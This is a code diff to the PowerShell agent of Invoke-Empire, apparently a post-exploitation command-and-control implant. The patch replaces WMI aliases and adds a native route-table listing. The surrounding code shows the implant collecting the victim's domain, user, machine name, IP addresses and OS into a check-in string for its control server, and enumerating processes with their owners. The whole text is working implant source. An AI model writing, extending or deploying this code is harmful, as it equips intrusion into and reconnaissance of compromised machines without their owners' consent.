@@ -210,7 +210,7 @@ function Invoke-Empire {
     function Get-Sysinfo {
         $str = $Servers[$ServerIndex]
         $str += '|' + [Environment]::UserDomainName+'|'+[Environment]::UserName+'|'+[Environment]::MachineName;
-        $p = (gwmi Win32_NetworkAdapterConfiguration|Where{$_.IPAddress}|Select -Expand IPAddress);
+        $p = (Get-WmiObject Win32_NetworkAdapterConfiguration|Where{$_.IPAddress}|Select -Expand IPAddress);
         $str += '|' +@{$true=$p[0];$false=$p}[$p.Length -lt 6];
         $str += '|' +(Get-WmiObject Win32_OperatingSystem).Name.split('|')[0];
         # if we're SYSTEM, we're high integrity
@@ -313,7 +313,7 @@ function Invoke-Empire {
             # this is stupid how complicated it is to get this information...
             '(ps|tasklist)' { 
                 $owners = @{}
-                gwmi win32_process | % {$o = $_.getowner(); if(-not $($o.User)){$o="N/A"} else {$o="$($o.Domain)\$($o.User)"}; $owners[$_.handle] = $o}
+                Get-WmiObject win32_process | % {$o = $_.getowner(); if(-not $($o.User)){$o="N/A"} else {$o="$($o.Domain)\$($o.User)"}; $owners[$_.handle] = $o}
                 if($cmdargs -ne "") { $p = $cmdargs }
                 else{ $p = "*" }
                 $output = Get-Process $p | % {
@@ -341,7 +341,30 @@ function Invoke-Empire {
             }
             getpid { $output = [System.Diagnostics.Process]::GetCurrentProcess() }
             route {
-                if ($cmdargs.length -eq ""){ $output = route print }
+                if (($cmdargs.length -eq "") -or ($cmdargs.lower() -eq "print")){ 
+                    # build a table of adapter interfaces indexes -> IP address for the adapater
+                    $adapters = @{}
+                    Get-WmiObject Win32_NetworkAdapterConfiguration | %{ $adapters[[int]($_.InterfaceIndex)] = $_.IPAddress }
+                    $output = Get-WmiObject win32_IP4RouteTable | %{
+                        $out = New-Object psobject
+                        $out | Add-Member Noteproperty 'Destination' $_.Destination
+                        $out | Add-Member Noteproperty 'Netmask' $_.Mask
+                        if ($_.NextHop -eq "0.0.0.0"){
+                            $out | Add-Member Noteproperty 'NextHop' "On-link"
+                        }
+                        else{
+                            $out | Add-Member Noteproperty 'NextHop' $_.NextHop
+                        }
+                        if($adapters[$_.InterfaceIndex] -and ($adapters[$_.InterfaceIndex] -ne "")){
+                            $out | Add-Member Noteproperty 'Interface' $($adapters[$_.InterfaceIndex] -join ",")
+                        }
+                        else {
+                            $out | Add-Member Noteproperty 'Interface' '127.0.0.1'
+                        }
+                        $out | Add-Member Noteproperty 'Metric' $_.Metric1
+                        $out
+                    } | ft -autosize | Out-String
+                }
                 else { $output = route $cmdargs }
             }
             '(whoami|getuid)' { [Security.Principal.WindowsIdentity]::GetCurrent().Name }
